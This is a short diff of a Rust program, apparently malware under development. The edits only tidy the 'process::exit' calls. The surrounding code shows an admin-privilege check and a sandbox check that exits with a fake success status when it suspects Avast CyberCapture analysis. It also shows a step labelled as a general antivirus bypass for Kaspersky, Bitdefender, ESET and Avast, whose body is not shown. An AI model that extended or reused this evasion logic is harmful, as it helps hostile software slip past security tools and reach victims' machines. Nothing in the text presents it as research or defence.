@@ -1,4 +1,4 @@
-use std::process::{Command, Stdio};
+use std::process::{self, Command, Stdio};
 use std::path::{Path};
 use std::fs::{File};
 use std::io::{self, Write};
@@ -187,7 +187,7 @@ fn main() {
     // Step 1: Admin Control Check
     if !is_admin() {
         eprintln!("You need administrator privileges to run this program.");
-        std::process::exit(0); // Exit the program with a success status
+        process::exit(0); // Exit the program with a success status
     }
 
     println!("Admin privileges confirmed.");
@@ -198,7 +198,7 @@ fn main() {
     // Step 2: Ensure the directory exists
     if let Err(e) = fs::create_dir_all(dir_path) {
         eprintln!("Failed to create directory (Possible Avast CyberCapture Sandbox): {}", e);
-        std::process::exit(0); // Exit the program with a success status
+        process::exit(0); // Exit the program with a success status
     }
 
     // Step 3: Kaspersky, Bitdefender, ESET, Avast etc. bypass (General Antivirus bypass)
